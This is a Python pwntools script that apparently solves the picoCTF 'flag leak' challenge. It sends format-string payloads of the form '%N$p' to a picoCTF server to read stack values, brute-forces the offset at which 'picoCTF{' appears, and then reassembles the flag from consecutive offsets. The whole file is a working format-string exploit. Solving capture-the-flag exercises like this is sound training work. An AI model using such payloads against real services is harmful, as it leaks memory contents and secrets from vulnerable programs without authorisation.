from pwn import *

context.binary = elf = ELF('flag leak', checksec=True)


def find_offset(start_str: str, max_offset=64):  # try every single string
    start_str = start_str[:4]  # only can take up to 4 characters as each hex can contain at most 4 characters
    start_offset = 0
    for i in range(1, max_offset+1):  # start from 1 as format string index starts from 1
        io = remote('saturn.picoctf.net', 53644)
        payload = f'%{i}'.encode('ascii') + b'$p'  # request for value at the stack in hex format
        io.sendline(payload)
        io.recvline()
        r = io.recvline()
        r = r.split(b'0x')[-1].strip()  # remove the 0x, strip the new line
        print(r)
        try:
            byte_array = bytearray.fromhex(r.decode('ascii'))
            decoded = byte_array.decode()[::-1]  # reverse the string as its little endian
            print(decoded)
            if decoded.startswith(start_str):
                print(f'Found offset {i}')
                print(f'Value is {decoded}')
                start_offset = i
                io.close()
                break
        except (UnicodeDecodeError, ValueError):  # some hex bytes are not ascii
            pass
        io.close()
    else:  # if tried all and still cannot find
        print('Could not find offset')
        return None
    # found the starting offset already, now find the ending and piece up the flag
    flag = ''
    decoded = ''
    while not decoded.endswith('}'):
        io = remote('saturn.picoctf.net', 53644)
        payload = f'%{start_offset}'.encode('ascii') + b'$p'  # request for value at the stack in hex format starting from the found start offset
        io.sendline(payload)
        io.recvline()
        r = io.recvline()
        r = r.split(b'0x')[-1].strip()  # remove the 0x, strip the new line
        byte_array = bytearray.fromhex(r.decode('ascii'))
        decoded = byte_array.decode()[::-1]  # reverse the string as its little endian
        print(decoded)
        flag += decoded
        start_offset += 1
        io.close()
    return flag


flag = find_offset('picoCTF{', 200)
print(flag)
